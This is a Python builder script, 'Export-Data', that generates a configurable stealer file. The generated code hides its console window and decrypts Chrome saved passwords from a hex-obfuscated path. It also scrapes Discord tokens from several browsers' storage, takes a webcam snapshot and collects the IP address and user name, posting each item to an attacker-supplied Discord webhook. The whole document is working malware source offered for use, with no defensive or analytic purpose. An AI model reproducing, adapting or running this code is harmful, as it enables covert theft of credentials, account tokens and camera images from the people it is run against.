"""
To Do:
    Kill switch

- feb/28/2021
"""

import os, time, sys

def print(element=None):
    if element is None:
        sys.stdout.write('')
    else:
        sys.stdout.write(element)


print('Welcome to Export-Data!\n\nWhat\'s the webhook url you want to set?\n')
webhook = input('> ')
if not webhook.startswith('http') and not webhook.__contains__('://') and not webhook.__contains__('.') and not webhook.__contains__('discord'):
    print('Invalid webhook.'); time.sleep(2); sys.exit()
print('What\'s the name of the bot?')
name = input('> ')
print('Please type y/n for yes/no\n\nDo you want to enable ip logging?')
ip = input('> ')
if ip != 'y' and ip != 'n':
    print('Please type y/n.'); time.sleep(2); sys.exit()
print('Do you want to enable Camera Screenshot?')
camera = input('> ')
if camera != 'y' and camera != 'n':
    print('Please type y/n.'); time.sleep(2); sys.exit()
print('Do you want to enable chrome logging?')
chrome = input('> ')
if chrome != 'y' and chrome != 'n':
    print('Please type y/n.'); time.sleep(2); sys.exit()
print('Do you want to enable Discord Token Logging?')
discord = input('> ')
if discord != 'y' and discord != 'n':
    print('Please type y/n.'); time.sleep(2); sys.exit()
print('Do you want to enable PC name logging?')
pc_name = input('> ')
if pc_name != 'y' and pc_name != 'n':
    print('Please type y/n.'); time.sleep(2); sys.exit()
print('Setting everything up..\n')


stuff = bytearray.fromhex("72225c2e2e5c4c6f63616c5c476f6f676c655c4368726f6d655c5573657220446174615c44656661756c745c4c6f67696e204461746122").decode()

value_1 = f'"url": "{webhook}", "name": "{name}", "file": []'

label = {
    "y": "True",
    "n": "False"
}

value_2=f'"ip": {label[ip]},"camera": {label[camera]},"chrome": {label[chrome]},"discord": {label[discord]},"pc-name": {label[pc_name]}'

code = """
import os, time, sys 
try:
    import requests, json, datetime, re, socket, datetime, logging, platform, cv2
    from datetime import date
    from pynput.keyboard import Key, Listener
except:
    print('Unable to import dependencies'); time.sleep(2); sys.exit()

config = {thing_1}
    {value_1}
{thing_2}
to_do = {thing_1}
    {value_2}
{thing_2}

def Clear():
    if platform.platform().startswith('Windows'):
	    os.system('cls')
    else:
	    os.system('clear')

def get_pcname():
    if platform.platform().startswith('Windows'):
        return os.getenv('username')
    else:
        return 'os'

def get_ip():
    try:
        return socket.gethostbyname(socket.gethostname()) 
    except:
        return None

def send(url = None, data = None):
    if url is None and config['url'] is None:
	    return None
    if config['name'] is None:
	    name = "default"
    else:
	    name = config['name']
    if url is None or type(url) is not str:
        url = config['url']
    try:
        if type(data) is str:
            r = requests.post(url, json={thing_1}"content":data, "name": name{thing_2})
        if type(data) is list:
            new_data = ""
            for each in data:
                new_data+=each+''
            r = requests.post(url, json={thing_1}"content":new_data, "name": name{thing_2})
        return r.status_code
    except:
         return False

def get_camera():
    try:
        ret, frame = cv2.VideoCapture(0).read()
        cv2.imwrite('h431gygy81g3f67ga8ft6ahtnj2437tg2gf.png',frame)
        url = config['url']
        files = {thing_1}'media': open('h431gygy81g3f67ga8ft6ahtnj2437tg2gf.png', 'rb'){thing_2}
        r = requests.post(url, files=files)
        os.remove('h431gygy81g3f67ga8ft6ahtnj2437tg2gf.png')
    except:
        return False

def extract_passwords():
    if platform.platform().startswith('Windows'):
        try:
            import sqlite3, win32crypt, win32console, win32gui
            win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)
            conn = sqlite3.connect(getenv("APPDATA") + {stuff})
            cursor = conn.cursor()
            cursor.execute('Select action_url, username_value, password_value FROM logins')
            info = ""
            for result in cursor.fetchall():
                password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
                if password:
                    info+=result[0]+':'+result[1]+str(password)+''
            return info
        except:
            return False
    else:
        return 'os'

def find_tokens():
    if platform.platform().startswith('Windows'):
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {thing_1}
            'Discord': roaming + '\\\\Discord',
            'Discord Canary': roaming + '\\\\discordcanary',
            'Discord PTB': roaming + '\\\\discordptb',
            'Google Chrome': local + '\\\\Google\\\\Chrome\\\\User Data\\\\Default',
            'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',
            'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',
            'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default'
        {thing_2}

        message = ''

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue
            message += f'**{thing_1}platform{thing_2}**```'

            path += '\\Local Storage\\leveldb'

            tokens = []

            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue

                for line in [x.strip() for x in open(f'{thing_1}path{thing_2}\\{thing_1}file_name{thing_2}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{thing_1}24{thing_2}\.[\w-]{thing_1}6{thing_2}\.[\w-]{thing_1}27{thing_2}', r'mfa\.[\w-]{thing_1}84{thing_2}'):
                        for token in re.findall(regex, line):
                            tokens.append(token)

            if len(tokens) > 0:
                for token in tokens:
                    message += f'{thing_1}token{thing_2}'
            else:
                message += 'No tokens found.'
        return message
    else:
        return 'os'

if to_do['ip']:
    send(config['url'], str(get_ip()))
if to_do['discord']:
    send(config['url'], str(find_tokens()))
if to_do['chrome']:
    send(config['url'], str(extract_passwords()))
if to_do['camera']:
    get_camera()
if to_do['pc-name']:
    send(config['url'], str(get_pcname()))""".format(stuff=str(stuff), thing_1="{", thing_2="}", value_1=str(value_1), value_2=str(value_2), ip=label[ip], camera=label[camera], chrome=label[chrome], discord=label[discord], pc_name=label[pc_name])

try:
    open('logger-togo.py', 'a+', encoding='utf-8').write(code)
except Exception as error:
    print(error)

print('\n\nFinished!\n'); time.sleep(2); sys.exit()
